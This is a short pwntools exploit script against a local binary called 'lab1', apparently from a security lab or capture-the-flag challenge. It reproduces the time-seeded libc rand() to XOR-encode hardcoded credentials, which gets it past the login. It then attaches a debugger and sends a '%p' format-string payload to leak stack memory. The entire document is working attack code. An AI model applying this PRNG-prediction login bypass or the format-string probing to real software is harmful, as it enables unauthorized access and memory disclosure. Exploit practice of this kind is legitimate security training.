from pwn import *
from ctypes import *


p = process('./lab1')
payload = b'admin'
new_payload = b''
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))
for a in payload:
    key = libc.rand() % 0xff
    new_a = bytes([a ^ key])
    new_payload += new_a
p.recvuntil(b'please input your username:')
p.send(new_payload)

payload = b'WelCome t0 t1D'
new_payload = b''
libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))
for a in payload:
    key = libc.rand() % 0xff
    new_a = bytes([a ^ key])
    new_payload += new_a
p.recvuntil(b'please input your password:')
p.send(new_payload)

p.recvuntil(b'>>>\n')
p.sendline(b'3')
p.recvuntil(b'Are you good at fmt???')
gdb.attach(p)
p.sendline(b'%p%p%p%p%p%p%p%p')

p.interactive()
